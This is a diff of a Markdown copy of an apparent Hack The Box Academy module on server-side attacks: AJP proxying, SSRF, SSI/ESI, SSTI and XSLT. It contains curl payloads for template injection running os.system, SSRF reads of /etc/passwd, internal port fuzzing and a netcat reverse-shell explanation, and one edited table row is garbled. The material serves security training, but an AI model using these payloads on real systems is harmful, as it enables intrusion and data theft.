@@ -73,14 +73,15 @@ The cheat sheet is a useful command reference for this module.
 
 ### SSTI Exploitation Example 2
 
-| **Command**                                                                                            | **Description**                                                      |
-| ------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------- |
-| `curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam`                                 | Interacting with the remote target (Spring payload)                  |
-| `curl -X POST -d 'email={{_self.env.display("TEST"}}' http://<TARGET IP>:<PORT>/jointheteam`           | Interacting with the remote target (Twig payload)                    |
-| `curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam`                     | Interacting with the remote target (Jinja2 basic injection)          |
-| `curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam`       | Interacting with the remote target (Jinja2 dump all classes payload) |
-| `curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam` | Interacting with the remote target (Tornado payload)                 |
-| `./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=blah`                                 | Automating the exploitation process with tplmap                      |
+| **Command**                                                                                      | **Description**                                                      |
+| ------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------- |
+| `curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam`                           | Interacting with the remote target (Spring payload)                  |
+| `curl -X POST -d 'email={{_self.env.display("TEST"}}' http://<TARGET IP>:<PORT>/jointheteam`     | Interacting with the remote target (Twig payload)                    |
+| `curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam`               | Interacting with the remote target (Jinja2 basic injection)          |
+| `curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam` | Interacting with the remote target (Jinja2 dump all classes payload) |
+| \`curl -X POST -d "email=                                                                        |                                                                      |
+
+\{{os.system('whoami')\}}" http://:/jointheteam`| Interacting with the remote target (Tornado payload) | |`./tplmap.py -u 'http://:/jointheteam' -d email=blah\` | Automating the exploitation process with tplmap |
 
 ### SSTI Exploitation Example 3
 
@@ -91,8 +92,6 @@ The cheat sheet is a useful command reference for this module.
 | `python3`                                                    | Starting the python3 interpreter                                    |
 
 <table data-header-hidden><thead><tr><th width="236"></th><th></th></tr></thead><tbody><tr><td><strong>Methods</strong></td><td><strong>Description</strong></td></tr><tr><td><code>__class__</code></td><td>Returns the object (class) to which the type belongs</td></tr><tr><td><code>__mro__</code></td><td>Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.</td></tr><tr><td><code>__subclasses__</code></td><td>Each new class retains references to subclasses, and this method returns a list of references that are still available in the class</td></tr><tr><td><code>__builtins__</code></td><td>Returns the builtin methods included in a function</td></tr><tr><td><code>__globals__</code></td><td>A reference to a dictionary that contains global variables for a function</td></tr><tr><td><code>__base__</code></td><td>Returns the base class inherited by the object</td></tr><tr><td><code>__init__</code></td><td>Class initialization method</td></tr></tbody></table>
-
-
 
 ## Introduction to Server-Side Attacks
 
@@ -127,8 +126,6 @@ This module will cover different types of Server-Side attacks and how to exploit
 
 Let's now dive into each attack in detail.
 
-
-
 ## AJP Proxy
 
 ***
@@ -161,8 +158,6 @@ After this file is created, install the docker package in your local machine and
 root@htb[/htb]$ sudo apt install docker.io
 root@htb[/htb]$ sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"
 ```
-
-
 
 ## Nginx Reverse Proxy & AJP
 
@@ -257,8 +252,6 @@ root@htb[/htb]$ curl http://127.0.0.1:80
 <SNIP>
 ```
 
-
-
 ## Apache Reverse Proxy & AJP
 
 ***
@@ -273,7 +266,7 @@ Note: As mentioned in the previous section, port 80 is in use in Pwnbox, and Apa
 
 The required commands and configuration files are the following:
 
-&#x20; Apache Reverse Proxy & AJP
+Apache Reverse Proxy & AJP
 
 ```shell-session
 root@htb[/htb]$ sudo apt install libapache2-mod-jk
@@ -294,7 +287,7 @@ Note: The below cURL command is the one you would normally use, since Apache is 
 
 **Accessing the "hidden" Tomcat page**
 
-&#x20; Apache Reverse Proxy & AJP
+Apache Reverse Proxy & AJP
 
 ```shell-session
 root@htb[/htb]$ curl http://127.0.0.1
@@ -336,8 +329,6 @@ If we configure everything correctly, we will be able to access the Apache Tomca
 
 ![image](https://academy.hackthebox.com/storage/modules/145/img/tomcat.png)
 
-
-
 ## Server-Side Request Forgery (SSRF) Overview
 
 ***
@@ -363,8 +354,6 @@ We can usually find SSRF vulnerabilities in applications that fetch remote resou
 **Note**: Always keep in mind that web application fuzzing should be part of any penetration testing or bug bounty hunting activity. That being said, fuzzing should not be limited to user input fields only. Extend fuzzing to parts of the HTTP request as well, such as the User-Agent.
 {% endhint %}
 
-
-
 ## SSRF Exploitation Example
 
 ***
@@ -380,7 +369,7 @@ Basic reconnaissance against the host shows there are only three open ports.
 
 **Nmap - Discovering Open Ports**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>
@@ -400,7 +389,7 @@ Let's issue a cURLrequest to the target server using the parameters `-i` to show
 
 **Curl - Interacting with the Target**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s http://<TARGET IP>
@@ -420,7 +409,7 @@ Date: Mon, 18 Oct 2021 09:01:02 GMT
 
 We can see the request redirected to `/load?q=index.html`, meaning the `q` parameter fetches the resource `index.html`. Let us follow the redirect to see if we can gather any additional information.
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 
@@ -456,7 +445,7 @@ In one terminal, let's use Netcat to listen on port 8080, as follows.
 
 **Netcat Listener**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ nc -nvlp 8080
@@ -468,7 +457,7 @@ Now, let us issue a request to the target web application with `http://<VPN/TUN 
 
 **Curl - Testing for SSRF**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"
@@ -484,7 +473,7 @@ We will receive the following into our Netcat listener confirming the SSRF vulne
 
 **Netcat Listener - Confirming SSRF**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 Connection received on <TARGET IP> 49852
@@ -515,7 +504,7 @@ Code: html
 
 **Start Python HTTP Server**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ python3 -m http.server 9090
@@ -525,7 +514,7 @@ root@htb[/htb]$ python3 -m http.server 9090
 
 **Start FTP Server**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ sudo pip3 install twisted
@@ -536,7 +525,7 @@ root@htb[/htb]$ sudo python3 -m twisted ftp -p 21 -r .
 
 **Retrieving a remote file through the target application - FTP Schema**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"
@@ -558,7 +547,7 @@ Date: Tue, 19 Oct 2021 11:21:09 GMT
 
 **Retrieving a remote file through the target application - HTTP Schema**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"
@@ -580,7 +569,7 @@ Date: Tue, 19 Oct 2021 11:26:18 GMT
 
 **Retrieving a local file through the target application - File Schema**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 
@@ -620,7 +609,7 @@ Remember, we only have two open ports on the target server. However, there is a 
 
 **Generate a Wordlist**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ for port in {1..65535};do echo $port >> ports.txt;done
@@ -630,7 +619,7 @@ root@htb[/htb]$ for port in {1..65535};do echo $port >> ports.txt;done
 
 **Curl - Interacting with the Target**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"
@@ -648,7 +637,7 @@ Date: Tue, 19 Oct 2021 11:36:25 GMT
 
 **Port Fuzzing**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
@@ -683,7 +672,7 @@ We have received a valid response for port `5000`. Let us check it as follows.
 
 **cURL - Interacting with the Target**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"
@@ -703,7 +692,7 @@ First, we issue a simple cURL request to the internal application we discovered 
 
 **cURL - Interacting with the Target**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"
@@ -726,7 +715,7 @@ Now, let us discover any web applications listening in localhost. Let us try to 
 
 **cURL - Interacting with the Target**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"
@@ -744,7 +733,7 @@ We have received an `unknown url type` error message. It seems the web applicati
 
 **cURL - Interacting with the Target**
 
-&#x20; SSRF Exploitation Example
+SSRF Exploitation Example
 
 ```shell-session
 root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"
@@ -966,8 +955,6 @@ root
  </a></body></html>
 ```
 
-
-
 ## Blind SSRF
 
 ***
@@ -980,8 +967,6 @@ We can detect blind SSRF vulnerabilities via out-of-band techniques, making the 
 * http://pingb.in
 
 Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.
-
-
 
 ## Blind SSRF Exploitation Example
 
@@ -1155,8 +1140,6 @@ whoami
 root
 ```
 
-
-
 ## Time-Based SSRF
 
 ***
@@ -1183,8 +1166,6 @@ We can see the service took 10 seconds to respond to the request. If we submit a
 ![image](https://academy.hackthebox.com/storage/modules/145/img/blind\_time2.png)
 
 In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.
-
-
 
 ## Server-Side Includes Overview
 
@@ -1224,8 +1205,6 @@ Server-side includes (`SSI`) is a technology used by web applications to create 
 The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives.
 
 We need to submit payloads to the target application, such as the ones mentioned above, through input fields to test for SSI injection. The web server will parse and execute the directives before rendering the page if a vulnerability is present, but be aware that those vulnerabilities can exist in blind format too. Successful SSI injection can lead to extracting sensitive information from local files or even executing commands on the target web server.
-
-
 
 ## SSI Injection Exploitation Example
 
@@ -1268,8 +1247,6 @@ Note: As we saw, running OS commands via SSI on the target application is possib
 * `nc <IP> <PORT> 0</tmp/foo`: Connect to the pentester machine and redirect the standard input descriptor
 * `| bin/bash 1>/tmp/foo`: Execute `/bin/bash` redirecting the standard output descriptor to `/tmp/foo`
 * `rm /tmp/foo`: Cleanup the FIFO file
-
-
 
 ## Edge-Side Includes (ESI)
 
@@ -1322,8 +1299,6 @@ In some cases, we can achieve remote code execution when the application process
 | Akamai ESI Test Server (ETS) |      Yes     |    Yes   |     Yes     |               No              |         No         |
 |          NodeJS esi          |      Yes     |    Yes   |     Yes     |               No              |         No         |
 |         NodeJS nodesi        |      Yes     |    No    |      No     |               No              |      Optional      |
-
-
 
 ## Introduction to Template Engines
 
@@ -1428,8 +1403,6 @@ Date: Mon, 25 Oct 2021 00:12:40 GMT
 	</html>
 ```
 
-
-
 ## SSTI Identification
 
 ***
@@ -1464,8 +1437,6 @@ In addition to the above diagram, we can try the following approaches to recogni
 * Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used
 * Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI
 * Send expressions with unclosed curly brackets to see if verbose errors are generated. Do not try this approach on production systems, as you may crash the webserver.
-
-
 
 ## SSTI Exploitation Example 1
 
@@ -1790,9 +1761,11 @@ It should be straightforward now that no methodology is bulletproof. We could co
 Eventually, when submitting [Tornado](https://www.tornadoweb.org/en/stable/guide/templates.html)-specific payloads, we will come across the below.
 
 ```shell-session
-root@htb[/htb]$ curl -X POST -d "email={% raw %}
+root@htb[/htb]$ curl -X POST -d "email=
+{% raw %}
 {% import os %}
-{% endraw %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam
+{% endraw %}
+{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam
 
 <html>
 <head>
@@ -1859,8 +1832,6 @@ root@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=
 
 Now, proceed to this section's exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of `tplmap`.
 
-
-
 ## SSTI Exploitation Example 3
 
 ***
@@ -1875,7 +1846,7 @@ User input is submitted via the `cmd` parameter through a GET request. Let's sub
 
 **cURL - Interacting with the Target**
 
-&#x20; SSTI Exploitation Example 3
+SSTI Exploitation Example 3
 
 ```shell-session
 root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={7*7}"
@@ -1939,7 +1910,7 @@ root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={7*7}"
 
 It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, `${7*7}` this time.
 
-&#x20; SSTI Exploitation Example 3
+SSTI Exploitation Example 3
 
 ```shell-session
 root@htb[/htb]$ curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}'
@@ -2002,7 +1973,7 @@ root@htb[/htb]$ curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}'
 
 It doesn't look like the application evaluated this expression either. What about `{{7*7}}`?
 
-&#x20; SSTI Exploitation Example 3
+SSTI Exploitation Example 3
 
 ```shell-session
 root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*7}}"
@@ -2067,7 +2038,7 @@ Luckily this time, the application evaluated the latest mathematical expression 
 
 As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Once again, let's use PortSwigger's diagram in the `SSTI Identification`. We already know that the `{{7*7}}` expression was evaluated successfully. The next expression the diagram suggests trying is `{{7*'7'}}`. Let us try it and see how the application responds.
 
-&#x20; SSTI Exploitation Example 3
+SSTI Exploitation Example 3
 
 ```shell-session
 root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"
@@ -2134,7 +2105,7 @@ We could have automated the template engine identification process we just execu
 
 **tplmap.py**
 
-&#x20; SSTI Exploitation Example 3
+SSTI Exploitation Example 3
 
 ```shell-session
 root@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'
@@ -2521,8 +2492,6 @@ A reverse shell can also be established through a payload such as the below.
 
 Now, proceed to this section's exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of `tplmap`.
 
-
-
 ## Attacking XSLT
 
 ***
@@ -2537,7 +2506,7 @@ First, install the required packages on Pwnbox or a local VM, as follows:
 
 **Installation of required packages**
 
-&#x20; Attacking XSLT
+Attacking XSLT
 
 ```shell-session
 root@htb[/htb]$ sudo apt install default-jdk libsaxon-java libsaxonb-java
@@ -2803,7 +2772,7 @@ To see the results, we will use the command line parser. This can be done as fol
 
 **Transformation through the terminal**
 
-&#x20; Attacking XSLT
+Attacking XSLT
 
 ```shell-session
 root@htb[/htb]$ saxonb-xslt -xsl:transformation.xsl catalogue.xml
@@ -2982,6 +2951,3 @@ Warning: at xsl:stylesheet on line 2 column 80 of fingerprinting.xsl:
 ```
 
 We can also use the following [wordlist](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/xslt.txt) for brute-forcing functionality available in target applications.
-
-
-
